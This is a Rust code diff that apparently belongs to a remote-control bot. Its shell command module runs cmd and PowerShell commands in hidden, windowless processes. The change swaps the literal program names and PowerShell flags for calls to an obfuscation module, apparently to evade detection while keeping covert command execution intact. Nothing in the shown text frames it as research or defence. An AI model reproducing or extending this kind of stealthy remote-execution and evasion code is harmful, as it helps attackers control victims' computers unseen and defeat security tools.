@@ -74,7 +74,9 @@ impl BotCommand for ShellCommand {
 
 impl ShellCommand {
     async fn execute_cmd(&self, command: &str) -> Result<String> {
-        let output = Command::new("cmd")
+        use crate::utils::obfuscate::exe;
+        
+        let output = Command::new(exe::cmd())
             .args(&["/C", command])
             .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
             .stdout(Stdio::piped())
@@ -97,12 +99,14 @@ impl ShellCommand {
     }
 
     async fn execute_powershell(&self, command: &str) -> Result<String> {
-        let output = Command::new("powershell")
+        use crate::utils::obfuscate::{exe, powershell};
+        
+        let output = Command::new(exe::powershell())
             .args(&[
-                "-WindowStyle",
-                "Hidden",
-                "-NonInteractive",
-                "-Command",
+                &powershell::window_style(),
+                &powershell::hidden(),
+                &powershell::non_interactive(),
+                &powershell::command(),
                 command,
             ])
             .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
